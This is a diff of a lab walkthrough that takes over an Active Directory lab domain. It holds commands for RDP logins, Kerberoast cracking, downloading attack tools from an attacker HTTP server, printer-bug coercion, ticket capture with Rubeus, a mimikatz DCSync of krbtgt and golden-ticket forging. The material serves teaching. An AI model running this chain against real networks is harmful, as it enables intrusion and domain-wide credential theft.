@@ -29,7 +29,8 @@ description: "Kerberos Ep.13 – Demonstrate your skills - A walkthrough of the 
 
 ![image4](../resources/0852f5bdc6fb4d92bfd3eee703dc469b.png)
 
-- Use credentials to rdp
+- Use credentials to rdp:
+
 ```bash
 xfreerdp /v:10.102.30.15 /u:s.villanelle /d:krbtown.local +clipboard +drives /drive:root,/home/kali /dynamic-resolution
 
@@ -72,6 +73,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=krb5tgs
 - Password: **blink182!**
 
 - RDP to wks-02:
+
 ```bash
 xfreerdp /v:10.102.52.164 /u:mssql_svc /p:blink182! /d:krbtown.local +clipboard +drives /drive:root,/home/kali /dynamic-resolution
 
@@ -80,16 +82,19 @@ xfreerdp /v:10.102.52.164 /u:mssql_svc /p:blink182! /d:krbtown.local +clipboard 
 ![image10](../resources/378f60dbf30941bc8d466ee1fdfcad9c.png)
 
 - Set up python server in Tools:
+
 ```bash
 python -m http.server
 
 ```
 - Use the native Powershell command to curl (this doesn't corrupt the file):
+
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/PowerView-Dev.ps1','PowerView-Dev.ps1')
 
 ```
 - Enumerating for unconstrained delegation:
+
 ```bash
 Get-DomainComputer -Unconstrained -Properties dnshostname
 
@@ -100,6 +105,7 @@ Get-DomainComputer -Unconstrained -Properties dnshostname
 - We are already on wks-02
 
 - Set up python server and download Rubeus, MS-RPRN, PsExec64 and mimikatz:
+
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.149.56:8080/Rubeus.exe','Rubeus.exe')
 
@@ -111,11 +117,13 @@ Get-DomainComputer -Unconstrained -Properties dnshostname
 
 ```
 - Open an elevated command prompt and monitor for TGT **(Open in CMD, not PS)**:
+
 ```bash
 .\Rubeus.exe monitor /interval:1 /nowrap
 
 ```
 - To force a connection to our compromised host Workstation-02, you can use the MS-RPRN tool by running it on an elevated PowerShell prompt:
+
 ```bash
 .\MS-RPRN.exe \\DC01.krbtown.local \\Workstation-02.krbtown.local
 
@@ -127,11 +135,13 @@ If no wrap wasn't used:
 - Copy the Base64 ticket and paste into Kali (ticket.txt):
 **Remove empty lines and white spaces from the Base64 ticket before passing it through Rubeus:**
 
-```python
+```bash
 python3 -c 'f=open("ticket.txt").read();import re;print(re.sub(r"\[\n\t\s\]\*", "", f))'
 ```
+
 - Copy the output and paste into the command (on Windows):
-```bash
+
+```powershell
 [IO.File]::WriteAllBytes("C:\Users\mssql_svc\DC.kirbi", [Convert]::FromBase64String("Base64 Ticket"))
 
 ```
@@ -140,14 +150,16 @@ python3 -c 'f=open("ticket.txt").read();import re;print(re.sub(r"\[\n\t\s\]\*", 
 Convert from Base64 and saves it in **DC.kirbi**:
 
 - Load the ticket into memory:
+
 ```bash
 .\Rubeus.exe ptt /ticket:DC.kirbi
 
 ```
+
 or
 
 ```bash
-.\Rubeus.exe ptt /ticket:\<base64\>
+.\Rubeus.exe ptt /ticket:<base64>
 
 ```
 or with
@@ -166,6 +178,7 @@ kerberos::ptt DC.kirbi
 ![image14](../resources/141340df50624dac9a60844f53a91e3c.png)
 
 - Run:
+
 ```bash
 .\mimikatz.exe
 lsadump::dcsync /domain:krbtown.local /user:krbtgt
@@ -187,6 +200,7 @@ That part is specific to that user account**
 
 - Run mimikatz
 - Create Kerberos Golden ticket with the information gathered above:
+
 ```bash
 kerberos::golden /domain:krbtown.local /sid:S-1-5-21-839606329-3182976252-758991142 /krbtgt:9a60db81a985dd1b22b3d34fa598fe19 /user:Administrator
 
@@ -202,6 +216,7 @@ This can be anything but Administrator is less conspicuous
 ![image19](../resources/7ec819c264434e379b257c9b860180fa.png)
 
 - Run .\mimikatz.exe again with the following command:
+
 ```bash
 kerberos::ptt ticket.kirbi
 
